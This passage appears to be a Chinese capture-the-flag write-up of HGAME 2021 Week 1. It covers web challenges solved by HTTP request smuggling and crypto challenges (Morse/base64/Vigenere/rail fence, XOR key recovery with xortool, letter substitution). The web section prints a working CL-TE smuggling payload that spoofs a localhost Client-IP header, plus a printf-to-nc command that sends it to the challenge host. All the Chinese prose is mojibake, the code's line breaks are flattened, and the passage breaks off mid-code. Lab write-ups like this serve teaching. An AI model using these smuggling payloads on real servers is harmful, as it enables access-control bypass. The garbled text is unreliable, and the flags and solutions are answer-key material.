éªŒè¯è¯·æ±‚ä¸­çš„Content-Lengthå¤´</p></blockquote><p>è¯•äº†è¯• <code>CL-TE</code>èµ°ç§æ”»å‡»ã€‚</p><p>å¤¹å¸¦è¯·æ±‚ä¸€ä¸‹ <code>/</code> çœ‹çœ‹ï¼Œæœç„¶èƒ½å¤Ÿè¿”å›ä¸»é¡µã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202211257785.png"></p><p>ç„¶åå¸¦ä¸Šæ”»å‡»çš„ <code>Client-IP</code> è¯•è¯•ï¼Œæ‹¿åˆ° flagã€‚</p><p><strong>payload:</strong></p><pre class="language-none"><code class="language-none">GET /secret HTTP/1.1Host: police.liki.linkContent-Length: 49Transfer-Encoding: chunked0GET /secret HTTP/1.1Client-IP: 127.0.0.1</code></pre><p>å°±æ˜¯è¯´å½“ ATS æŠŠè¿™ä¸€ä¸ª GET è¯·æ±‚äº¤ç»™ Nginx çš„æ—¶å€™ï¼Œåé¢çš„ Nginx è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ª GET è¯·æ±‚ï¼Œäºæ˜¯å½“</p><pre class="language-none"><code class="language-none">GET /secret HTTP/1.1Client-IP: 127.0.0.1</code></pre><p>è¿™ä¸€éƒ¨åˆ†åˆ° Nginx çš„æ—¶å€™ï¼Œå°±èƒ½ä¼ªé€ æœ¬åœ°äº†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202211600422.png"></p><p><code>hgame{HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!}</code></p><h3 id="èµ°ç§è€…çš„æ„¤æ€’"><a href="#èµ°ç§è€…çš„æ„¤æ€’" class="headerlink" title="èµ°ç§è€…çš„æ„¤æ€’"></a>èµ°ç§è€…çš„æ„¤æ€’</h3><blockquote><p><strong>æœ¬é¢˜ä¸ºå®è—èµ°ç§è€…çš„æ›´æ”¹ç‰ˆæœ¬ï¼Œè€ƒç‚¹ç›¸åŒï¼Œè¯·å…ˆåšå‡ºå®è—èµ°ç§è€…</strong><br>Liki æ—¥è®°ï¼š<br>2020å¹´2æœˆ2æ—¥ï¼š<br>ä»Šå¤©è­¦å±€å¯„æ¥ä¸€å°ä¿¡ï¼Œæ˜¯èµ°ç§è€… Switch å¯„æ¥çš„ï¼Œä¿¡é‡Œåªæœ‰ä¸€å¥è¯<br><strong>â€œæˆ‘æœ€è®¨åŒé¡ºé£è½¦ï¼Œæˆ‘å°†å¸¦æ¥æˆ‘çš„æ„¤æ€’â€</strong><br>çœŸæ˜¯è®©äººæ‘¸ä¸ç€å¤´è„‘â€¦â€¦<br>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ã€‚</p><p>Challenge Address: <a href="http://police.liki.link/">http://police.liki.link</a> </p></blockquote><p>å’Œä¸Šé¢é‚£é¢˜ä¸åŒï¼Œè¿™ä¸ªç›´æ¥è®¿é—®å°±ç»™å‡ºäº† <code>Client-IP</code>ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202215124791.png"></p><p>ä½†æ˜¯ payload å…¶å®æ˜¯ä¸€æ ·çš„ã€‚</p><p>ä¸è¿‡åœ¨ Burp Suite ä¸ä¸€å®šèƒ½å‡ºæ¥ï¼Œä»–åŸºæœ¬ä¸Šæ˜¯åªæ˜¾ç¤ºäº†ç¬¬ä¸€ä¸ªè¿”å›çš„ responseï¼Œemmm æ„Ÿè§‰æ˜¯ burp è®¾è®¡ä¸Šçš„é—®é¢˜ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202222723524.png"></p><p>ä½†æ˜¯ç›´æ¥åœ¨ nc é‡Œæ‰§è¡Œå°±å¥½äº†å•¦ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">'GET /secret HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>'</span>'Host: police.liki.link<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Content-Length: <span class="token number">49</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Transfer-Encoding: chunked<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token number">0</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>GET /secret HTTP/1.1<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Host: police.liki.link<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Client-IP: <span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n'<span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">42.193</span>.143.243 <span class="token number">80</span></code></pre><p>å¾ˆæ˜æ˜¾èƒ½çœ‹åˆ°è¿”å›äº†ä¸¤ä¸ªå“åº”ï¼Œå¤šå‘å‡ æ¬¡å°±èƒ½åœ¨ç¬¬äºŒä¸ªè¿”å›é‡Œçœ‹åˆ° flag äº†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203031441834.png"></p><p><code>hgame{Fe3l^tHe~4N9eR+oF_5mu9gl3r!!}</code></p><blockquote><p>çœ‹äº†å®˜æ–¹ WPï¼ŒåŸæ¥è¿™é¢˜ä¸­é—´å¤šå¥—äº†ä¸€å±‚ Nginxï¼Œæ¶æ„æ˜¯ ATS -&gt; Nginx -&gt; LNMPï¼Œè€Œå‰é¢é‚£é¢˜æ˜¯ ATS -&gt; LNMPã€‚</p></blockquote><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ã¾ã²ã¨"><a href="#ã¾ã²ã¨" class="headerlink" title="ã¾ã²ã¨"></a>ã¾ã²ã¨</h3><blockquote><p><strong>hint: flagçš„æ ¼å¼ä¸ºhgame{xxx}ï¼ˆé‡è¦ï¼‰</strong><br> å¤§å®¶å¥½ï¼Œæˆ‘å«çœŸäººï¼Œæ¥è‡ªå’’æœ¯å›æˆ˜ï¼Œä½ ä¹Ÿå¯ä»¥å«æˆ‘ï¼Œç¼åˆæ€ªï¼ï¼</p></blockquote><pre class="language-none"><code class="language-none">---../-..../-..-./.----/-----/----./-..-./.----/-----/---../-..-./.----/.----/-----/-..-./----./-----/-..-./---../--.../-..-./...../...--/-..-./.----/-----/---../-..-./----./----./-..-./.----/-----/----./-..-./---../...../-..-./.----/.----/-..../-..-./---../....-/-..-./--.../.----/-..-./.----/-----/---../-..-./.----/.----/....-/-..-./----./--.../-..-./---../....-/-..-./.----/.----/..---/-..-./...../--.../-..-./---../-..../-..-./.----/-----/----./-..-./.----/.----/-..../-..-./.----/.----/-..../-..-./.----/-----/-----/-..-./.----/-----/--.../-..-./.----/.----/..---/-..-./.----/-----/...../-..-./--.../...--/-..-./---../....-/-..-./--.../-----/-..-./---../----./-..-./.----/-----/-----/-..-./-..../----./-..-./--.../-----/-..-./...../..---/-..-./----./-----/-..-./---../...--/-..-./--.../-----/-..-./.----/.----/.----/-..-./----./----./-..-./-..../----./-..-./....-/---../-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./....-/---../-..-./....-/---../-..-./.----/.----/....-/-..-./--.../----./-..-./---../---../-..-./.----/-----/....-/-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./.----/.----/-----/-..-./--.../....-/-..-./---../...../-..-./---../....-/-..-./---../-..../-..-./...../--.../-..-./--.../----./-..-./----./--.../-..-./.----/.----/-----/-..-./...../...--/-..-./.----/-----/-..../-..-./---../...../-..-./.----/-----/----./-..-./----./----./-..-./....-/---../-..-./.----/-----/.----/-..-./-..../...../-..-./-..../.----/-..-./-..../.----</code></pre><p>Morse code</p><pre class="language-none"><code class="language-none">86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61</code></pre><p>ç„¶å chrï¼Œbase64</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">"86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61"</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>    x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    r <span class="token operator">+=</span> x<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment"># VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA==</span>r2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span><span class="token comment"># b'Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x'</span></code></pre><p>Vigenere è§£å¯†å¾—åˆ°</p><pre class="language-none"><code class="language-none">}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n</code></pre><p>çœ‹ä¸Šå»åƒæ˜¯é€†åºäº†çš„</p><pre class="language-none"><code class="language-none">n4yGu~zF_BLhrfp9+C{1Eez!upPlN1!tYnccK}</code></pre><p>çœ‹æ ·å­åˆä¸åƒã€‚é‡Œé¢éƒ½æ²¡æœ‰ <code>hgame</code>ï¼Œåˆè¯•äº†è¯•æ …æ ï¼Œè¿™ä¸å¯¹åŠ²å•Šã€‚</p><hr><p>çœ‹äº†å®˜æ–¹ WP åï¼Œè¿™6ä¸ªæ …æ å°±ç¦»è°±ï¼</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210207220856104.png"></p><p>å¤ªå¥‡æ€ªäº†ï¼ï¼ï¼</p><pre class="language-none"><code class="language-none">}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n=====&gt;}!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu</code></pre><p>ç„¶åé€†åº</p><pre class="language-none"><code class="language-none">utnzr{pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!}</code></pre><p>å‡¯æ’’ / ROT13</p><pre class="language-none"><code class="language-none">hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!}</code></pre><h3 id="å¯¹ç§°ä¹‹ç¾"><a href="#å¯¹ç§°ä¹‹ç¾" class="headerlink" title="å¯¹ç§°ä¹‹ç¾"></a>å¯¹ç§°ä¹‹ç¾</h3><blockquote><p>ç¾æœ¯å¤§å¸ˆ Liki æ€»è¯´ï¼Œå¯¹ç§°æ˜¯ä¸–ç•Œä¸Šæœ€ç¾çš„ç»“æ„â€¦</p></blockquote><p>æºç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> itertools<span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAGkey <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">for</span> m<span class="token punctuation">,</span> k <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>cycle<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token comment">#cipher=b'&gt;\tA+/\x01@"\x08T\x1a\x1a\x17\x05\x07\x11\x143Kf5\x0cQ&gt;Q\x00\x1b\x11\x17\x01\x19\x00Y?V21D[6Q~\x12TG\x05\x1c\x0b@3V!b\x0bFp\x15\x06\x12\x03^\n\x12EV;T\',\x07Qp\x14\x15\x10\x1c\x17\x0b\x01\rQ(\x18L-\x11@~Q \x1b\x1dDD\x16\nA6\\f \x01\x14$\x19\x11S\x1bU\x0e\x10\x06@)\x182*\x01Y#\x14\x18\x05\x11DHUoV/Lf+\x10\x143\x10\x1aS\x15[\x17\x1aEF?T\'6\x01\x14$\x1eT\x10\x1b[\x0b\x07\x16\x14;V"bn[$\x19\x11\x01TT\x0b\x18\x15[)Q2+\x0bZ1\x1dT\x07\x11T\x0c\x1b\x0cE/]5lnm?\x04T\x1e\x15ND\x1b\n@zJ##\x08]*\x14T\x1a\x00\x1bD\x17\x10@zA)7\x16\x142\x03\x15\x1a\x1a\x17n\x1c\x16\x148M5;DC?\x03\x1f\x1a\x1aPD\x17\x00\\3V"b\x10\\5Q\x07\x10\x11Y\x01\x06E@5\x185\'\x01_p{\x1b\x06\x00\x17\x17\x0c\x08Y?L4;DC8\x14\x1aS\rX\x11U\t[5Sf#\x10\x141Q\x04\x12\x1dY\x10\x1c\x0bSt\x18L\x16\x0cQ"\x14T\x12\x06RD\x06\x00B?J\'.DF5\x10\x07\x1c\x1aDD\x13\nFzL.+\x17\x1ap%\x1c\x16T=\x02\x1c\x17G.\x18/1D@8\x10\x00S\x03RC\x07\x00\x142Y4&amp;IC9\x03\x11\x17TC\x0bU\t[5Sf$\x0bFp{\x1d\x07Z\x17+\x00\x17\x14;V%+\x01Z$Q\x15\x1d\x17R\x17\x01\nF)\x18+#\x1d\x14&gt;\x1e\x00S\x1cV\x12\x10E\\;\\fH\x05\x14&gt;\x10\x19\x16TQ\x0b\x07E].\x14f \x11@p\x05\x1c\x16\r\x17\x0f\x1b\x00CzL.#\x10\x14$\x19\x11\x1a\x06\x17n\x1a\x12ZzZ)&amp;\rQ#Q\x03\x16\x06RD\x17\x04G3[\'.\x08Mp\x02\r\x1e\x19R\x10\x07\x0cW;Tjb\x05Gp{\x03\x16\x06RD\x01\r[)]f-\x02\x14 \x1e\x00\x16\x1aC\r\x14\t\x14*J#&amp;\x05@?\x03\x07S\x1bED\x05\x17Q#\x16fH0\\5\x03\x11\x15\x1bE\x01YE@2Q5b\x07U=\x14T\x1a\x1a\x17\x0c\x14\x0bP#\x181*\x01@8\x14\x06S~T\x0c\x1a\nG3V!b\x05\x14=\x10\x00\x16X\x17\x07\x14\x11W2Q(%DP9\x1f\x1a\x16\x06\x17\x0b\x07E&gt;;N)+\x00]&gt;\x16T\x11\x11^\n\x12E[4\x182*\x01\x14=\x14\x1a\x06TX\x02U\x04\x14)V\'0\x08]&gt;\x16XS~_\x11\x1b\x02F#\x186#\x07_p\x1e\x12S\x03X\x08\x03\x00GzW4b\x06Q1\x03\x07R~c\x05\x1e\x00\x14;\x18*-\x0b_p\x10\x00S\rX\x11\x07ER;[#b\rZp\x05\x1c\x16TZ\r\x07\x17[(\x18L#\nPp\x18\x19\x12\x13^\n\x10EUzT/,\x01\x14#\x05\x06\x12\x1dP\x0c\x01EP5O(b\x10\\5Q~\x1e\x1dS\x00\x19\x00\x1aza)7CX&lt;Q\x07\x16\x11\x17\x06\x1a\x11\\zK/&amp;\x01Gp\x1e\x12S\rX\x11\x07E&gt;&lt;Y%\'DU"\x14T\x03\x06R\x10\x01\x1c\x14)A+/\x01@"\x18\x17\x12\x18\x19D!\r])\x18/1D&gt;;\x1f\x1b\x04\x1a\x17\x05\x06EV3T\'6\x01F1\x1dT\x00\rZ\t\x10\x11F#\x18\',\x00\x149\x05S\x00T=\x13\x1d\x00F?\x18$-\x10\\p\x02\x1d\x17\x11DD\x10\x0c@2]4b\x17]4\x14T\x1c\x12\x17\x10\x1d\x0cGz2"+\x12]4\x18\x1a\x14T[\r\x1b\x00\x14;H6\'\x05Fp\x1c\x1b\x01\x11\x17\x0b\x07EX?K5b\x10\\5Q\x07\x12\x19RJ\x7f6[zP#0\x01\x149\x02T\x07\x1cRD\x13\tU=\x02fH\x0cS1\x1c\x11\x08,\x07\x16*\x0c\x01wY\x1977\x076$EX@Y\x00Q\x03a\x14V?\x1d\'\x05 9G\x01\t='</span></code></pre><p>åˆ©ç”¨ <a href="https://github.com/hellman/xortool">xortool</a>ï¼Œå¯ä»¥å¸®åŠ©å¾—åˆ°è¿™ä¸ªåŠ å¯†ä½¿ç”¨çš„ keyã€‚</p><blockquote><p><strong>xortool.py</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">xortool  A tool to <span class="token keyword">do</span> some xor analysis:  - guess the key length <span class="token punctuation">(</span>based on count of equal chars<span class="token punctuation">)</span>  - guess the key <span class="token punctuation">(</span>base on knowledge of <span class="token function">most</span> frequent char<span class="token punctuation">)</span>Usage:  xortool <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m MAX-LEN<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t CHARSET<span class="token punctuation">]</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>  xortool <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l LEN<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c CHAR <span class="token operator">|</span> -b <span class="token operator">|</span> -o<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t CHARSET<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PLAIN<span class="token punctuation">]</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>  xortool <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m MAX-LEN<span class="token operator">|</span> -l LEN<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c CHAR <span class="token operator">|</span> -b <span class="token operator">|</span> -o<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t CHARSET<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PLAIN<span class="token punctuation">]</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>  xortool <span class="token punctuation">[</span>-h <span class="token operator">|</span> --help<span class="token punctuation">]</span>  xortool --versionOptions:  -x --hex                          input is hex-encoded str  -l LEN, --key-length<span class="token operator">=</span>LEN          length of the key  -m MAX-LEN, --max-keylen<span class="token operator">=</span>MAX-LEN  maximum key length to probe <span class="token punctuation">[</span>default: <span class="token number">65</span><span class="token punctuation">]</span>  -c CHAR, --char<span class="token operator">=</span>CHAR              <span class="token function">most</span> frequent char <span class="token punctuation">(</span>one char or hex code<span class="token punctuation">)</span>  -b --brute-chars                  brute force all possible <span class="token function">most</span> frequent chars  -o --brute-printable              same as -b but will only check printable chars  -f --filter-output                filter outputs based on the charset  -t CHARSET --text-charset<span class="token operator">=</span>CHARSET target text character <span class="token builtin class-name">set</span> <span class="token punctuation">[</span>default: printable<span class="token punctuation">]</span>  -p PLAIN --known-plaintext<span class="token operator">=</span>PLAIN  use known plaintext <span class="token keyword">for</span> decoding  -h --help                         show this <span class="token builtin class-name">help</span></code></pre><p>ç”±äºå®ƒçš„ FILE è¾“å…¥éœ€è¦çš„æ˜¯ binary æˆ–è€… hex æˆ–è€… plain textï¼Œè€Œè¿™é‡Œçš„ cipher æ˜¯ Python é‡Œçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å…ˆè½¬æ¢æˆ hexã€‚</p></blockquote><pre class="language-python" data-language="python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">'xxxxxx'</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ç„¶åæŠŠè¿™ä¸ª hex ä¿å­˜åˆ°æ–‡ä»¶ï¼Œæ¯”å¦‚ <code>cipher.txt</code>.</p><p>è¯•äº†ä¸€ä¸‹ï¼ŒæŒ‡å®š <code>-l 16</code> å€’æ²¡ä½œç”¨ï¼Œ<code>-p "hgame{"</code> ç”šè‡³ä¼šæŠ¥é”™ã€‚æœ€åè¿˜æ˜¯ç”¨ä¸‹é¢è¿™ä¸ªå¥½äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ xortool -x -c <span class="token number">20</span> cipher.txtThe <span class="token function">most</span> probable key lengths: <span class="token number">2</span>:  <span class="token number">10.3</span>% <span class="token number">4</span>:  <span class="token number">10.9</span>% <span class="token number">6</span>:   <span class="token number">9.3</span>% <span class="token number">8</span>:  <span class="token number">15.0</span>%<span class="token number">10</span>:   <span class="token number">7.7</span>%<span class="token number">12</span>:   <span class="token number">8.5</span>%<span class="token number">14</span>:   <span class="token number">7.4</span>%<span class="token number">16</span>:  <span class="token number">15.5</span>%<span class="token number">32</span>:   <span class="token number">7.8</span>%Key-length can be <span class="token number">4</span>*n<span class="token number">2</span> possible key<span class="token punctuation">(</span>s<span class="token punctuation">)</span> of length <span class="token number">16</span>:4Z8FB<span class="token operator">!</span>4Pqtst7d<span class="token string">'e4Z8FB!4P4tst7d'</span>eFound <span class="token number">2</span> plaintexts with <span class="token number">95</span>%+ valid charactersSee files filename-key.csv, filename-char_used-perc_valid.csv</code></pre><p>çœ‹ä¸€çœ‹è¾“å‡ºçš„æ–‡ä»¶ï¼Œå·²ç»å¾ˆæœ‰å‘³é“äº†ï¼Œflag éƒ½å¾ˆæ˜æ˜¾äº†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210204023958672.png"></p><p>æ ¹æ®å‡ºæ¥çš„ key <code>4Z8FB!4Pqtst7d'e</code>ï¼Œæœ‰ä¸¤ä¸ªä¸åœ¨ <code>string.ascii_letters + string.digits</code> èŒƒå›´å†…çš„å­—ç¬¦ï¼Œäºæ˜¯è€ƒè™‘çˆ†ç ´ä¸€ä¸‹æ‰¾çœŸæ­£çš„ keyã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> stringkeys <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digitscipher <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span><span class="token comment"># 4Z8FB!4Pqtst7d'e</span><span class="token keyword">for</span> i <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">"4Z8FB"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"4Pqtst7due"</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>value <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>idx <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">+=</span> x    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'===='</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'===='</span><span class="token punctuation">)</span>    <span class="token comment"># print(r)</span>    <span class="token keyword">if</span> <span class="token string">'hgame'</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></code></pre><p>ä¸¤ä¸ªä½ç½®éƒ½è¯•ä¸€è¯•ï¼Œæœ€åçœ‹å“ªä¸ªæœ€åˆç†ã€‚</p><p>æœ€åå¾—å‡ºæ˜¯ <code>4Z8FBd4Pqtst7due</code></p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210204024350143.png"></p><pre class="language-none"><code class="language-none">Symmetry in art is when the elements of a painting or drawing balance each other out. This could be the objects themselves, but it can also relate to colors and other compositional techniques.You may not realize it, but your brain is busy working behind the scenes to seek out symmetry when you look at a painting. There are several reasons for this. The first is that we're hard-wired to look for it. Our ancient ancestors may not have had a name for it, but they knew that their own bodies were basically symmetrical, as were those of potential predators or prey. Therefore, this came in handy whether choosing a mate, catching dinner or avoiding being on the menu of a snarling, hungry pack of wolves or bears!Take a look at your face in the mirror and imagine a line straight down the middle. You'll see both sides of your face are pretty symmetrical. This is known as bilateral symmetry and it's where both sides either side of this dividing line appear more or less the same.So here is the flag: hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}</code></pre><p>ç„¶åå‘ç°è¿™ä¸ªå±…ç„¶çœŸçš„æœ‰åŸæ–‡ï¼Œå°±æ˜¯ <strong>å¯¹ç§°ä¹‹ç¾</strong>ï¼ˆSymmetry in Artï¼‰ï¼Œè¯¦è§</p><blockquote><p><a href="https://www.pencilkings.com/symmetry-in-art/">5 Reasons Why We Love Symmetry in Art so Much (And How You Can Use This Research to Create Even More Awesome Paintings)</a></p></blockquote><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><blockquote><p>æ‰€æœ‰äººéƒ½å·²åšå¥½å‡†å¤‡,æœˆé»‘ä¹‹æ—¶å³å°†æ¥ä¸´,ä¸ºäº†å‡»æ¯æœ€åçš„ä¸»æ§èƒ½é‡æŸ±,æ‰“å¼€é€šå¾€èŠåŠ å“¥çš„å‡é™æ¡¥è¿«åœ¨çœ‰ç« çœ‹å®ˆå‡é™æ¡¥çš„æ§åˆ¶å‘˜å·²ç»å¤±è¸ª,å”¯æœ‰åœ¨æ§åˆ¶å°çš„å°æˆ¿é—´ç•™ä¸‹æ¥çš„å°çº¸æ¡,ä¼¼ä¹æ˜¯æ§åˆ¶å‘˜é˜²æ­¢è‡ªå·±è€äº†æŠŠå¯†ç å¿˜è®°è€Œå†™ä¸‹çš„,ä½†ä¼¼ä¹éƒ½æ˜¯å¥‡æ€ªçš„å­—æ¯ç»„åˆ,å”¯ä¸€æœ‰ä»·å€¼çš„çº¿ç´¢æ˜¯åƒåœ¾æ¡¶é‡Œçš„ä¸¤å †è¢«ç¢çº¸æœºç²‰ç¢çš„ç¢çº¸,éšä¾¿æŸ¥çœ‹å‡ å¼ ,ä¼¼ä¹æ˜¯ä¸¤ä»½æ–‡ä»¶,å¹¶ä¸”å…¶ä¸­ä¸€ä»½å’Œå°çº¸æ¡ä¸Šçš„å­—æ¯è§„å¾‹æœ‰ç‚¹ç›¸åƒ é™„ä»¶md5:0340142700c8f63546368fa14fd6fb24</p><p><a href="https://1.oss.hgame2021.vidar.club/Transformer.zip">https://1.oss.hgame2021.vidar.club/Transformer.zip</a> \</p></blockquote><p><code>Transformer.txt</code>:</p><pre class="language-none"><code class="language-none">Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk "qypth{hp5d_s0n_szi^3ic&amp;qh11a_}",Dai'o sanyho oa pcc oqh dhpn po oqh hic.</code></pre><p>å¾ˆæ˜æ˜¾è¿™ä¸ªå°±æ˜¯å¯†æ–‡äº†ï¼Œflag å°±è—åœ¨è¿™ä¸ªé‡Œé¢äº†ã€‚</p><p>ç„¶åç»™äº† ori å’Œ encï¼ŒåŸæ–‡å’Œå¯†æ–‡ï¼Œéšæ„çœ‹äº†ä¸€ä¸‹è¿˜æ‰“ä¹±é¡ºåºäº†ï¼Œåè€¶ã€‚</p><p>ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå‘ç°æ˜¯å¯¹ç§°åŠ å¯†ï¼Œè€Œä¸”åªæ˜¯å°å†™å­—æ¯è¿›è¡Œäº†å¯¹æ¢ï¼Œå…¶ä»–å­—ç¬¦éƒ½ä¸å˜ã€‚</p><p>é‚£ç›´æ¥æ‰¾è¶³å¤Ÿå¤šçš„æ ·æœ¬ï¼Œå¾—åˆ°æ˜ å°„å…³ç³»å°±å®Œäº‹äº†ã€‚</p><p>payload æœ‰ç‚¹ä¹±ï¼Œå¤§æ¦‚æ€è·¯é¦–å…ˆæ˜¯æ‰¾å‡ ä¸ªæ ·æœ¬ï¼Œç„¶åæ ¹æ®æ ·æœ¬å¾—åˆ°åŒ¹é…å¯¹ pairï¼Œæœ€åè§£å¯†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> stringos<span 